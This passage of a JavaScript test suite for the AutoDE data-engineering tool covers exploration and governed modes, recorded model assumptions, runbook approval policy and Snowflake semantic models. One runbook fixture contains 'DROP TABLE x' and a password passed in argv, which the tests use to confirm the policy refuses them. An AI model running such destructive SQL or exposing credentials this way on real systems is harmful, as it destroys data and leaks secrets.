    const cited = { evidence: [{ type: 'chat_message', ref: 'chat:c#0' }] };
    assert.deepStrictEqual(sr.unrecordedStatements(turns, [cited]).map((s) => s.ref), ['chat:c#6']);
    assert.deepStrictEqual(sr.unrecordedStatements(turns, []).map((s) => s.ref), ['chat:c#0', 'chat:c#6']);
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-review-'));
    try {
      sr.dismissStatements(ws, ['chat:c#6']);
      assert.deepStrictEqual(sr.unrecordedStatements(turns, [cited], sr.dismissedStatements(ws)), []);
      assert.match(sr.renderUnrecorded(sr.unrecordedStatements(turns, [])), /2 message\(s\)[\s\S]*\/review record <n>/);
    } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.48.0: exploration mode — switched with an acknowledged disclaimer; a stage continues past a context gap with a recorded assumption where governed mode stops and asks; checks warn; switching to governed lists everything to harden', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const M = fresh('../dist/engine/documents/problemMode.js');
    const SG = require('../dist/engine/agents/stageGaps.js');
    const A = require('../dist/engine/agents/assignment.js');
    const { AssertionLedger } = require('../dist/engine/context/ledger.js');
    const { layoutPath } = require('../dist/engine/workspaceLayout.js');
    const D = require('../dist/engine/documents/problemDocuments.js');
    const DA = fresh('../dist/engine/workflows/documentApproval.js');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-explore-'));
    try {
      const root = layoutPath(ws, 'problems', 'p1');
      nodeFs.mkdirSync(root, { recursive: true });
      D.writeBusinessProblemSpec(root, { id: 'bps-1', version: 2, status: 'approved', problemStatement: 'Retention', objectives: [], successCriteria: [], scope: { in: [], out: [] }, constraints: [], assumptions: [], createdAt: 'x', updatedAt: 'x' });
      assert.strictEqual(M.problemMode(root), 'governed');
      assert.throws(() => M.setProblemMode(root, 'exploration', { by: 'ana', channel: 'cli' }), /disclaimer/);
      // Governed: a gap stops the agent; an assumption is refused.
      const gap = { needed: 'relationship', subject: ['a', 'b'], text: 'orders ↔ customers', reason: 'absent', minTrust: 'confirmed' };
      assert.match(SG.renderStageGaps(SG.stageGapsFrom([gap], 'mapping'), 'governed'), /stop and ask the person/);
      const ledger = new AssertionLedger(layoutPath(ws, 'ledger'));
      await ledger.load();
      const guess = { kind: 'relationship', subject: ['shop.orders', 'shop.customers'], predicate: 'joins_to', value: { from: { entity: 'shop.orders', columns: ['customer_id'] }, to: { entity: 'shop.customers', columns: ['customer_id'] } }, statement: 'orders.customer_id joins customers.customer_id', model: 'copilot:gpt-x', stepId: 'map', reason: 'same column name' };
      await assert.rejects(M.recordAssumption(ledger, root, guess), /governed/);
      // Exploration: acknowledged, recorded; the agent assumes and continues; the assumption closes the gap.
      const r = M.setProblemMode(root, 'exploration', { by: 'ana', channel: 'cli', acknowledged: true }, { now: new Date('2026-10-27T10:00:00Z') });
      assert.deepStrictEqual([r.record.mode, r.record.by, r.record.acknowledged === M.EXPLORATION_DISCLAIMER, r.record.history.length], ['exploration', 'ana', true, 1]);
      const text = SG.renderStageGaps(SG.stageGapsFrom([gap], 'mapping', 'exploration'), 'exploration');
      assert.match(text, /don't stop[\s\S]*autode_record_assumption/);
      const a = await M.recordAssumption(ledger, root, guess);
      assert.deepStrictEqual([a.status, a.trust, a.flags, a.model, a.specId, a.evidence[0].ref], ['active', 'assumed', ['assumption', 'exploration'], 'copilot:gpt-x', 'bps-1', 'model:copilot:gpt-x@map']);
      const closed = { ...gap, reason: 'below_trust', foundTrust: 'assumed' };
      assert.deepStrictEqual(SG.stageGapsFrom([closed], 'mapping', 'exploration'), [], 'the assumption closes it in exploration');
      assert.strictEqual(SG.stageGapsFrom([closed], 'mapping', 'governed').length, 1, 'but not in governed mode');
      // Model proposals count at once, at assumed trust (a correction still waits).
      const p = { kind: 'business_term', subject: ['x'], predicate: 'defined_as', value: { term: 'x' }, statement: 's', evidence: [{ type: 'file', ref: 'r' }], status: 'proposed', trust: 'inferred' };
      assert.deepStrictEqual([M.admitForMode(p, 'exploration').status, M.admitForMode(p, 'exploration').trust], ['active', 'assumed']);
      assert.strictEqual(M.admitForMode(p, 'governed'), p);
      // The assignment says so, for any host.
      const asg = A.assignmentText({ problemId: 'p1', stage: { id: 'map', title: 'Map', kind: 'mapping', status: 'ready' }, role: 'r', roleDescription: 'd', roleInstructions: 'i', skills: [], tier: 'propose', engineTools: [], fileMode: 'read-only', consumes: [], produces: [], doneWhen: 'x', tasks: [], externalSkills: [], contextGaps: [], mode: 'exploration' });
      assert.match(asg, /## Exploration mode[\s\S]*autode_record_assumption[\s\S]*non-production environments only/);
      assert.ok(A.toolsForTier([{ name: 'autode_record_assumption', annotations: {} }], 'propose', ['autode_propose_assertion']).includes('autode_record_assumption'));
      // Checks warn instead of refusing: a target context built for another specification version.
      nodeFs.mkdirSync(nodePath.join(root, 'context'), { recursive: true });
      nodeFs.writeFileSync(nodePath.join(root, 'context', 'target-context.yaml'), 'specId: bps-1\nspecVersion: 1\nstatus: built\nplatform: snowflake\n');
      assert.deepStrictEqual(DA.documentApprovalCheck(root, 'target-context').errors, []);
      assert.match(DA.documentApprovalCheck(root, 'target-context').warnings[0], /another version/);
      M.recordWarnedCheck(root, { check: 'target context approval', stage: 'target', detail: 'built for another version' });
      // Back to governed: the hardening list; the same check refuses again.
      const g = M.setProblemMode(root, 'governed', { by: 'ana', channel: 'cli' }, { workspaceRoot: ws });
      assert.deepStrictEqual([g.hardening.assumptions.map((x) => x.id), g.hardening.modelOnly.length, g.hardening.warned.length], [[a.id], 0, 1]);
      assert.match(M.renderHardening(g.hardening), /## Assumptions \(1\)[\s\S]*guessed by copilot:gpt-x[\s\S]*## Checks that only warned \(1\)/);
      assert.match(DA.documentApprovalProblems(root, 'target-context')[0], /another version/);
      assert.strictEqual(M.readModeRecord(root).history.length, 2);
    } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.48.0: never relaxed — runbook policy, production, sample-data consent and secrets behave the same in both modes; an exploration problem targets non-production environments only; deliverables and manifests are labelled', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const M = fresh('../dist/engine/documents/problemMode.js');
    const RB = fresh('../dist/engine/runner/runbook.js');
    const P = fresh('../dist/engine/runner/policy.js');
    const { gateQueryResult } = require('../dist/engine/platform/sampleData.js');
    const { layoutPath } = require('../dist/engine/workspaceLayout.js');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-relax-'));
    try {
      const root = layoutPath(ws, 'problems', 'p1');
      nodeFs.mkdirSync(root, { recursive: true });
      nodeFs.mkdirSync(nodePath.dirname(layoutPath(ws, 'approvals')), { recursive: true });
      nodeFs.writeFileSync(layoutPath(ws, 'approvals'), 'runbooks:\n  environments:\n    dev: { connections: [snowflake:dev], approvers: any }\n    prod: { connections: [snowflake:prod], approvers: [priya] }\n');
      const policy = P.loadRunbookPolicy(ws);
      const connections = [{ id: 'snowflake:dev', platform: 'snowflake', credentials: { resolver: 'cli', ref: 'dev' } }, { id: 'snowflake:prod', platform: 'snowflake', credentials: { resolver: 'cli', ref: 'prod' } }];
      const rb = (conn) => ({ id: 'deploy-x', title: 't', reason: 'r', connectionId: conn, steps: [{ id: 's1', title: 'drop', kind: 'sql', sql: 'DROP TABLE x', expect: 'gone' }, { id: 's2', title: 'cli', kind: 'cli', argv: ['snow', 'object', 'list', '--password=hunter2'], expect: 'x' }] });
      const record = (conn) => ({ runbook: rb(conn), revision: RB.runbookRevision(rb(conn)), environment: '', status: 'awaiting-approval', problemId: 'p1', approvals: [], steps: {} });
      const rows = { columns: ['email'], rows: [{ email: 'a@b.c' }], rowCount: 1 };
      const outcome = (mode) => {
        if (mode === 'exploration') M.setProblemMode(root, 'exploration', { by: 'ana', channel: 'cli', acknowledged: true }); else M.setProblemMode(root, 'governed', { by: 'ana', channel: 'cli' });
        const check = RB.checkRunbook(rb('snowflake:dev'), { workspaceRoot: ws, connections, policy });
        return {
          check: [check.ok, check.errors.some((e) => /no rollback|rollback/.test(e)), check.errors.some((e) => /credential|not allowed/.test(e))],
          consent: gateQueryResult(rows, { allowSampleData: false, metadata: false, connectionId: 'snowflake:dev' }).withheld !== undefined,
          devApproval: !!RB.approveRunbook(root, record('snowflake:dev'), 'ana', 'cli', policy).record,
          prodByStranger: RB.approveRunbook(root, record('snowflake:prod'), 'bob', 'cli', policy).problem
        };
      };
      const governed = outcome('governed');
      const exploration = outcome('exploration');
      assert.deepStrictEqual(governed.check, [false, true, true], 'destructive needs a rollback; no credentials in argv');
      assert.deepStrictEqual([exploration.check, exploration.consent, exploration.devApproval], [governed.check, governed.consent, governed.devApproval]);
      assert.match(governed.prodByStranger, /not an approver/);
      assert.match(exploration.prodByStranger, /exploration mode, which targets non-production environments only/);
      assert.match(RB.approveRunbook(root, record('snowflake:unlisted'), 'priya', 'cli', policy).problem, /non-production/, 'unlisted counts as production');
      // Labelled: the deliverable's first line and its grounding manifest.
      const { recordArtifact } = fresh('../dist/engine/agents/artifacts.js');
      const out = recordArtifact({ workspaceRoot: ws, problemId: 'p1', problemRoot: root, stage: { id: 'build', kind: 'build' }, path: 'models/x.sql', content: 'select 1', who: { kind: 'agent', name: 'pipeline-engineer' }, channel: 'mcp', sources: { graph: { nodes: [], edges: [] }, assertions: [] } });
      const sql = nodeFs.readFileSync(nodePath.join(ws, out.path), 'utf8');
      assert.ok(sql.startsWith(`-- ${M.EXPLORATION_LABEL}\n`) && sql.endsWith('select 1'), sql);
      assert.strictEqual(JSON.parse(nodeFs.readFileSync(nodePath.join(ws, out.manifestPath), 'utf8')).exploration, true);
    } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.48.0: capture and exploration on every surface — autode coverage, problems mode (a person, acknowledged) and hardening; autode_capture_coverage, autode_record_assumption (refused when governed) and proposals admitted in exploration over MCP', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-c4c-'));
    let client;
    try {
      nodeFs.writeFileSync(nodePath.join(ws, 'shop.sql'), c4a.read('sources/shop.ddl'));
      client = await mcpSession(ws);
      const call = async (name, args = {}) => (await client.callTool({ name, arguments: args })).structuredContent;
      const raw = async (name, args = {}) => client.callTool({ name, arguments: args });
      await call('autode_ingest_file', { path: 'shop.sql', system: 'shop' });
      await call('autode_start_problem', { problemStatement: 'Daily net revenue from shop.orders and shop.refunds, by channel' });
      const cov = await call('autode_capture_coverage');
      assert.ok(cov.tables.some((t) => t.fqn === 'shop.orders') && cov.metrics.some((m) => m.metric === 'net revenue') && /# Capture coverage/.test(cov.markdown), JSON.stringify(cov).slice(0, 400));
      const guess = { kind: 'grain', subject: ['shop.refunds'], predicate: 'grain', value: ['refund_id'], statement: 'one row per refund', model: 'claude', reason: 'its key' };
      const refused = await raw('autode_record_assumption', guess);
      assert.ok(refused.isError && /governed/.test(JSON.stringify(refused.content)));
      await client.close(); client = undefined;
      // The CLI: a person switches the mode, acknowledging the disclaimer.
      const W = ['--workspace', ws];
      assert.strictEqual((await cli(['problems', 'mode', 'exploration', ...W])).code, 4, 'a person at a terminal');
      assert.strictEqual((await cli(['problems', 'mode', 'exploration', ...W], { interactive: true, answers: ['yes'] })).code, 4, 'acknowledged by typing explore');
      const sw = await cli(['problems', 'mode', 'exploration', ...W], { interactive: true, answers: ['explore'] });
      assert.strictEqual(sw.code, 0, sw.out + sw.err);
      assert.match(sw.asked[0], /results may be completely wrong/i);
      assert.match((await cli(['problems', 'mode', ...W])).out, /is exploration/);
      client = await mcpSession(ws);
      const c2 = async (name, args = {}) => (await client.callTool({ name, arguments: args })).structuredContent;
      const a = await c2('autode_record_assumption', guess);
      assert.deepStrictEqual([a.assertion.status, a.assertion.trust], ['active', 'assumed']);
      const p = await c2('autode_propose_assertion', { assertion: { kind: 'business_term', subject: ['channel'], predicate: 'defined_as', value: { term: 'channel', definition: 'web or store' }, statement: 'Channel is web or store.', evidence: [{ type: 'chat_message', ref: 'chat:x#1' }] }, model: 'claude' });
      assert.deepStrictEqual([p.assertion.status, p.assertion.trust], ['active', 'assumed']);
      assert.match(p.next, /exploration mode/);
      await client.close(); client = undefined;
      const cov2 = await cli(['coverage', ...W]);
      assert.ok(cov2.code === 0 && /## shop\.refunds[\s\S]*~ grain: one row per \(refund_id\)/.test(cov2.out), cov2.out);
      const hard = await cli(['problems', 'hardening', ...W, '--json']);
      assert.deepStrictEqual([hard.json().assumptions.length, hard.json().modelOnly.length], [1, 1]);
      const back = await cli(['problems', 'mode', 'governed', ...W], { interactive: true, answers: ['governed'] });
      assert.ok(back.code === 0 && /## Assumptions \(1\)[\s\S]*## Model-only facts \(1\)/.test(back.out), back.out);
    } finally { if (client) await client.close(); nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  // ── v0.49.0: C5a — the semantic layer: shared models, composites, checks, the editor ──

  const c5a = {
    graph() { return c4c.graph(); },
    golden() {
      const { createSubjectResolver } = require('../dist/engine/context/projection.js');
      const { parseYaml } = require('../dist/engine/context/Yaml.js');
      const resolve = createSubjectResolver(c5a.graph());
      return parseYaml(c4a.read('golden/assertions.yaml')).assertions.map((a) => ({ ...a, subject: a.subject.map((s) => resolve(s) ?? s), statement: a.statement ?? a.id, createdBy: 'golden', createdAt: '', validFrom: '' }));
    },
    ws() {
      const os = require('node:os'); const fs = require('node:fs'); const p = require('node:path');
      const ws = fs.mkdtempSync(p.join(os.tmpdir(), 'autode-sem-'));
      return { ws, shared: (name, text) => { fs.mkdirSync(p.join(ws, 'autode-output', 'semantic'), { recursive: true }); fs.writeFileSync(p.join(ws, 'autode-output', 'semantic', `${name}.yaml`), text); }, composite: (problem, name, text) => { fs.mkdirSync(p.join(ws, 'autode-output', problem, 'semantic'), { recursive: true }); fs.writeFileSync(p.join(ws, 'autode-output', problem, 'semantic', `${name}.yaml`), text); }, done: () => fs.rmSync(ws, { recursive: true, force: true }) };
    },
    sales: [
      'name: sales',
      'tables:',
      '  - name: orders',
      '    base_table: { database: RETAIL, schema: shop, table: orders }',
      '    primary_key: { columns: [order_id] }',
      '    dimensions:',
      '      - { name: order_id, expr: order_id, data_type: BIGINT, unique: true }',
      '      - { name: channel, expr: channel }',
      '      - { name: customer_id, expr: customer_id }',
      '    time_dimensions:',
      '      - { name: order_ts, expr: order_ts }',
      '    facts:',
      '      - { name: tax_amount, expr: tax_amount }',
      '    metrics:',
      '      - { name: total_tax, expr: SUM(tax_amount) }',
      '  - name: customers',
      '    base_table: { database: RETAIL, schema: shop, table: customers }',
      '    primary_key: { columns: [customer_id] }',
      '    dimensions:',
      '      - { name: customer_id, expr: customer_id }',
      'relationships:',
      '  - name: orders_to_customers',
      '    left_table: orders',
      '    right_table: customers',
      '    relationship_columns: [{ left_column: customer_id, right_column: customer_id }]',
      '    join_type: left_outer',
      '    relationship_type: many_to_one',
      ''
    ].join('\n'),
    customer: [
      'name: customer',
      'tables:',
      '  - name: customers',
      '    base_table: { database: RETAIL, schema: shop, table: customers }',
      '    primary_key: { columns: [customer_id] }',
      '    dimensions:',
      '      - { name: customer_id, expr: customer_id }',
      '      - { name: country_code, expr: country_code }',
      '    metrics:',
      '      - { name: customer_count, expr: COUNT(DISTINCT customer_id) }',
      ''
    ].join('\n')
  };

  await test('v0.49.0: shared models are Snowflake semantic model YAML — unknown keys refused (AutoDE\'s metadata goes beside them), names unique, relationships between its tables; serialization is fixed-order and byte-stable', () => {
    const M = require('../dist/engine/semantic/model.js');
    const ok = M.parseSemanticModel(c5a.sales);
    assert.deepStrictEqual([ok.errors, ok.model.tables.map((t) => t.name)], [[], ['orders', 'customers']]);
    const bad = M.parseSemanticModel(c5a.sales.replace('    primary_key: { columns: [order_id] }', '    primary_key: { columns: [order_id] }\n    autode_backing: [F1]'));
    assert.match(bad.errors.join(), /"autode_backing" is not a Snowflake semantic model key[\s\S]*\.autode\/semantic/);
    assert.match(M.parseSemanticModel(c5a.sales.replace('      - { name: channel, expr: channel }', '      - { name: channel, expr: channel }\n      - { name: channel, expr: currency }')).errors.join(), /"channel" is defined twice/);
    assert.match(M.parseSemanticModel(c5a.sales.replace('right_table: customers', 'right_table: clients')).errors.join(), /no table "clients"/);
    assert.match(M.parseSemanticModel(c5a.sales.replace('    base_table: { database: RETAIL, schema: shop, table: customers }', '')).errors.join(), /"base_table" is required/);
    const text = M.serializeSemanticModel(ok.model);
    assert.strictEqual(M.serializeSemanticModel(M.parseSemanticModel(text).model), text, 'stable');
    assert.ok(text.indexOf('base_table') < text.indexOf('primary_key') && text.indexOf('primary_key') < text.indexOf('dimensions'));
    assert.strictEqual(M.semanticRevision(text), M.semanticRevision(text.replace(/\n/g, '\r\n')), 'line endings don\'t change the revision');
  });

  await test('v0.49.0: composites — resolve byte-identically twice; a redefinition of a shared expression, key or join is refused; a collision between shared models is named; changing a shared model makes the composite stale until resolved again, with the diff', () => {
    const fs = require('node:fs');
    const C = require('../dist/engine/semantic/composite.js');
    const S = fresh('../dist/engine/semantic/store.js');
    const w = c5a.ws();
    try {
      w.shared('sales', c5a.sales); w.shared('customer', c5a.customer);
      const comp = ['autode: semantic-composite/1', 'name: revenue_by_channel', 'description: Daily revenue by channel.', 'uses:', '  - model: sales', '    metrics: [total_tax]', '  - model: customer', '    tables: [customers]', 'add:', '  metrics:', '    - { table: orders, name: tax_per_order, expr: "SUM(tax_amount) / COUNT(order_id)" }', 'describe:', '  orders.channel: { synonyms: [sales channel] }', ''].join('\n');
      w.composite('p1', 'revenue_by_channel', comp);
      const r1 = S.resolveCompositeFile(w.ws, 'p1', 'revenue_by_channel');
      assert.ok(r1.ok, r1.errors.join());
      const first = fs.readFileSync(r1.resolvedFile, 'utf8');
      const r2 = S.resolveCompositeFile(w.ws, 'p1', 'revenue_by_channel');
      assert.deepStrictEqual([r2.changed, fs.readFileSync(r2.resolvedFile, 'utf8') === first], [false, true], 'byte-identical');
      assert.match(first, /^# Resolved by AutoDE from the composite revenue_by_channel[\s\S]*# Shared models: customer@[0-9a-f]{12}, sales@[0-9a-f]{12}\n/);
      const resolved = require('../dist/engine/semantic/model.js').parseSemanticModel(first).model;
      const customers = resolved.tables.find((t) => t.name === 'customers');
      assert.deepStrictEqual(customers.metrics.map((m) => m.name), ['customer_count'], 'the same table from two models: identical, merged');
      const orders = resolved.tables.find((t) => t.name === 'orders');
      assert.deepStrictEqual([orders.metrics.map((m) => m.name), orders.dimensions.find((d) => d.name === 'channel').synonyms], [['total_tax', 'tax_per_order'], ['sales channel']]);
      assert.strictEqual(S.readComposite(w.ws, 'p1', 'revenue_by_channel').status, 'resolved');
      // Redefinitions are refused.
      const load = S.sharedLoader(w.ws);
      const redefine = C.parseComposite(comp.replace('name: tax_per_order, expr: "SUM(tax_amount) / COUNT(order_id)"', 'name: total_tax, expr: "SUM(tax_amount) * 2"')).composite;
      assert.match(C.resolveComposite(redefine, load).errors.join(), /total_tax: refused — orders\.total_tax is already defined by the shared model sales[\s\S]*new metric with its own name/);
      assert.match(C.parseComposite(comp.replace('add:\n', 'add:\n  relationships: []\n')).errors.join(), /add\.relationships: refused[\s\S]*joins and columns belong to the shared model/);
      assert.match(C.parseComposite(comp.replace('orders.channel: { synonyms: [sales channel] }', 'orders.channel: { expr: currency }')).errors.join(), /describe\.orders\.channel\.expr: refused/);
      // A collision is named.
      w.shared('customer', c5a.customer.replace('primary_key: { columns: [customer_id] }', 'primary_key: { columns: [country_code] }'));
      assert.match(S.resolveCompositeFile(w.ws, 'p1', 'revenue_by_channel').errors.join(), /collision: table "customers" is defined differently by sales and customer \(primary_key \(customer_id\) vs \(country_code\)\)/);
      w.shared('customer', c5a.customer);
      // Changing a shared model makes the composite stale.
      w.shared('sales', c5a.sales.replace('expr: SUM(tax_amount)', 'expr: SUM(tax_amount + 0)'));
      const stale = S.readComposite(w.ws, 'p1', 'revenue_by_channel');
      assert.deepStrictEqual([stale.status, /the shared model sales changed/.test(stale.staleBecause.join())], ['stale', true]);
      assert.ok(S.semanticWaiting(w.ws, 'p1').some((x) => x.key === 'semantic:p1/revenue_by_channel' && /Resolve/.test(x.title)));
      const again = S.resolveCompositeFile(w.ws, 'p1', 'revenue_by_channel');
      assert.ok(again.changed && /\+ .*SUM\(tax_amount \+ 0\)/.test(again.diff), again.diff);
      assert.strictEqual(S.readComposite(w.ws, 'p1', 'revenue_by_channel').status, 'resolved');
    } finally { w.done(); }
  });

  await test('v0.49.0: drafting from the reference problem\'s facts gives the expected model (golden file); the checks find a missing column and a relationship that contradicts a key', () => {
    const fs = require('node:fs'); const p = require('node:path');
    const D = require('../dist/engine/semantic/draft.js');
    const M = require('../dist/engine/semantic/model.js');
    const K = require('../dist/engine/semantic/checks.js');
    const graph = c5a.graph(); const assertions = c5a.golden();
    const ids = ['shop.orders', 'shop.order_items', 'shop.refunds', 'shop.customers', 'crm.customers'].map((t) => `obj:${t.split('.')[0]}/prod/${t}`);
    const d = D.draftSemanticModel({ graph, assertions, tableIds: ids, name: 'sales', database: 'RETAIL' });
    const text = M.serializeSemanticModel(d.model);
    const golden = p.join(__dirname, 'golden', 'semantic', 'retail-orders.sales.yaml');
    if (process.env.AUTODE_UPDATE_GOLDEN === '1') { fs.mkdirSync(p.dirname(golden), { recursive: true }); fs.writeFileSync(golden, text); }
    assert.strictEqual(text, fs.readFileSync(golden, 'utf8').replace(/\r\n/g, '\n'), 'matches the golden draft (AUTODE_UPDATE_GOLDEN=1 to update after review)');
    assert.deepStrictEqual(M.validateSemanticModel(JSON.parse(JSON.stringify(d.model))).errors, [], 'a valid Snowflake model');
    assert.deepStrictEqual(d.backing['relationship:order_items_to_orders'], ['A-rel-items-orders']);
    assert.deepStrictEqual(d.backing['order_items.net_revenue'], ['A-metric-net-revenue']);
    assert.ok(d.notes.some((n) => /retention_90d: its fact defines it in words only/.test(n)), d.notes.join());
    assert.ok(!d.model.relationships.some((r) => /support_tickets/.test(r.name)), 'trap 4: no invented join');
    const clean = K.checkSemanticModel(d.model, { graph, assertions });
    assert.deepStrictEqual(clean.filter((f) => f.severity === 'error'), [], JSON.stringify(clean));
    // A missing column, and a join whose "one" side isn't the key.
    const broken = JSON.parse(JSON.stringify(d.model));
    broken.tables.find((t) => t.name === 'orders').dimensions.push({ name: 'region', expr: 'region' });
    broken.relationships.push({ name: 'orders_to_items', left_table: 'orders', right_table: 'order_items', relationship_columns: [{ left_column: 'order_id', right_column: 'order_id' }], relationship_type: 'many_to_one' });
    broken.tables.find((t) => t.name === 'order_items').metrics[0].expr = 'SUM(order_items.quantity)';
    const f = K.checkSemanticModel(broken, { graph, assertions }).filter((x) => x.severity === 'error').map((x) => `${x.where}: ${x.message}`);
    assert.ok(f.some((x) => /^orders\.region: region isn't a column of shop\.orders/.test(x)), f.join('\n'));
    assert.ok(f.some((x) => /^relationship:orders_to_items: contradicts the key of order_items \(order_item_id\)/.test(x)), f.join('\n'));
    assert.ok(f.some((x) => /^order_items\.net_revenue: fact A-metric-net-revenue defines net_revenue as/.test(x)), 'a metric its fact defines otherwise');
    assert.deepStrictEqual(K.exprIdentifiers("SUM(CASE WHEN o.status <> 'CANCELLED' THEN amount ELSE 0 END)"), ['o.status', 'amount']);
  });

  await test('v0.49.0: approval and the editor — a shared model is approved by a person at its revision (refused while a check fails; an edit makes it "changed" and waiting); an agent\'s proposal, once approved, writes and approves it; a composite in exploration approves with warnings; the editor\'s state, form edits and an add-only draft merge', async () => {
    const fs = require('node:fs'); const p = require('node:path');
    const S = fresh('../dist/engine/semantic/store.js');
    const E = fresh('../dist/engine/semantic/editorState.js');
    const P = fresh('../dist/engine/decisions/proposals.js');
    const { DecisionStore } = fresh('../dist/engine/decisions/decisionStore.js');
    const M = fresh('../dist/engine/documents/problemMode.js');
    const { layoutPath } = require('../dist/engine/workspaceLayout.js');
    const ctx = (ws) => ({ workspaceRoot: ws, graph: c5a.graph(), assertions: c5a.golden() });
    const w = c5a.ws();
    try {
      w.shared('sales', c5a.sales);
      const s1 = E.semanticEditorState(p.join(w.ws, 'autode-output', 'semantic', 'sales.yaml'), c5a.sales, ctx(w.ws));
      assert.deepStrictEqual([s1.kind, s1.name, s1.shared.status], ['shared', 'sales', 'unapproved']);
      const err = { severity: 'error', where: 'orders', message: 'x' };
      assert.strictEqual(S.approveShared(w.ws, 'sales', { by: 'ana', channel: 'cli', findings: [err] }).ok, false, 'a failing check refuses');
      assert.ok(S.approveShared(w.ws, 'sales', { by: 'ana', channel: 'cli', findings: [] }).ok);
      assert.strictEqual(S.readShared(w.ws, 'sales').status, 'approved');
      assert.ok(fs.existsSync(p.join(w.ws, '.autode', 'semantic', 'shared', 'sales.yaml')) && !/approved/.test(fs.readFileSync(p.join(w.ws, 'autode-output', 'semantic', 'sales.yaml'), 'utf8')), 'metadata beside the model, never in it');
      // Form edits: new text for the file (undoable in the editor).
      let text = E.applySemanticEdit(c5a.sales, { op: 'set', table: 'orders', list: 'dimensions', name: 'channel', field: 'synonyms', value: 'sales channel, route' });
      text = E.applySemanticEdit(text, { op: 'add', table: 'orders', list: 'metrics', name: 'order_count', expr: 'COUNT(order_id)' });
      text = E.applySemanticEdit(text, { op: 'remove', table: 'orders', list: 'facts', name: 'tax_amount' });
      assert.match(text, /synonyms:\n\s+- sales channel\n\s+- route/);
      assert.ok(/order_count/.test(text) && !/name: tax_amount/.test(text));
      assert.throws(() => E.applySemanticEdit(text, { op: 'add', table: 'orders', list: 'metrics', name: 'channel', expr: 'x' }), /exists/);
      w.shared('sales', text);
      assert.strictEqual(S.readShared(w.ws, 'sales').status, 'changed');
      assert.ok(S.semanticWaiting(w.ws).some((x) => x.key === 'semantic:sales' && /changed since ana approved it/.test(x.detail)));
      // Draft from knowledge merges add-only.
      const d = require('../dist/engine/semantic/draft.js').draftSemanticModel({ graph: c5a.graph(), assertions: c5a.golden(), tableIds: ['obj:shop/prod/shop.orders', 'obj:shop/prod/shop.order_items'], name: 'sales', database: 'RETAIL' });
      const merged = E.mergeDraft(text, d.model);
      assert.ok(merged.added.includes('order_items') && merged.added.includes('orders.currency') && merged.added.includes('relationship order_items_to_orders'), merged.added.join());
      assert.ok(/order_count/.test(merged.text) && /- sales channel/.test(merged.text), 'nothing written is changed');
      // An agent's proposal: validated, then applied once a person approves — writing and approving it.
      const root = layoutPath(w.ws, 'problems', 'p1');
      fs.mkdirSync(root, { recursive: true });
      const store = new DecisionStore(w.ws);
      assert.throws(() => P.propose(store, { workspaceRoot: w.ws, problemRoot: root, problemId: 'p1' }, 'semantic_model', { scope: 'shared', name: 'customer', content: 'name: customer\ntables: []\n' }, { proposedBy: { host: 'mcp' } }), /tables/);
      const dec = P.propose(store, { workspaceRoot: w.ws, problemRoot: root, problemId: 'p1' }, 'semantic_model', { scope: 'shared', name: 'customer', content: c5a.customer }, { proposedBy: { host: 'mcp', client: 'test' } });
      assert.deepStrictEqual([dec.stakes, dec.subject.document, dec.subject.revision], ['high', 'semantic:shared/customer', 'none']);
      store.resolve(dec.id, { decision: 'approved', by: 'ana', channel: 'panel' });
      const applied = await P.applyDecision(store, dec.id, { workspaceRoot: w.ws, problemRoot: root, problemId: 'p1' });
      assert.ok(applied.applied, applied.message);
      assert.deepStrictEqual([S.readShared(w.ws, 'customer').status, S.readShared(w.ws, 'customer').approved.by], ['approved', 'ana']);
      // A composite: approved within its problem; in exploration a failing check only warns.
      w.composite('p1', 'tax', ['autode: semantic-composite/1', 'name: tax', 'uses:', '  - model: customer', ''].join('\n'));
      assert.strictEqual(S.approveComposite(w.ws, 'p1', 'tax', { by: 'ana', channel: 'cli', findings: [], problemRoot: root }).ok, false, 'not resolved yet');
      assert.ok(S.resolveCompositeFile(w.ws, 'p1', 'tax').ok);
      assert.strictEqual(S.approveComposite(w.ws, 'p1', 'tax', { by: 'ana', channel: 'cli', findings: [err], problemRoot: root }).ok, false, 'governed: refused');
      M.setProblemMode(root, 'exploration', { by: 'ana', channel: 'cli', acknowledged: true });
      const ex = S.approveComposite(w.ws, 'p1', 'tax', { by: 'ana', channel: 'cli', findings: [err], problemRoot: root });
      assert.deepStrictEqual([ex.ok, ex.warnings], [true, ['orders: x']]);
      assert.strictEqual(S.readComposite(w.ws, 'p1', 'tax').approvalCurrent, true);
      const cs = E.semanticEditorState(p.join(w.ws, 'autode-output', 'p1', 'semantic', 'tax.yaml'), fs.readFileSync(p.join(w.ws, 'autode-output', 'p1', 'semantic', 'tax.yaml'), 'utf8'), ctx(w.ws));
      assert.deepStrictEqual([cs.kind, cs.problemId, cs.mode, cs.compositeStatus.status, !!cs.preview], ['composite', 'p1', 'exploration', 'resolved', true]);
      assert.strictEqual(E.semanticEditorState(p.join(w.ws, 'autode-output', 'p1', 'semantic', 'tax.resolved.yaml'), '', ctx(w.ws)).kind, 'resolved');
      // The old snapshot is gone.
      assert.ok(!fs.existsSync(p.join(__dirname, '..', 'dist', 'context', 'SemanticLayerManager.js')));
    } finally { w.done(); }
  });

  await test('v0.49.0: the semantic layer on every surface — autode semantic draft, show, compose, resolve, check, approve (a person); over MCP list, check, draft, resolve, resources and a proposal; the editor is registered for semantic folders', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-c5a-'));
    let client;
    try {
      nodeFs.writeFileSync(nodePath.join(ws, 'shop.sql'), c4a.read('sources/shop.ddl'));
      client = await mcpSession(ws);
      const call = async (name, args = {}) => (await client.callTool({ name, arguments: args })).structuredContent;
      await call('autode_ingest_file', { path: 'shop.sql', system: 'shop' });
      await call('autode_start_problem', { problemStatement: 'Daily tax from shop.orders by channel' });
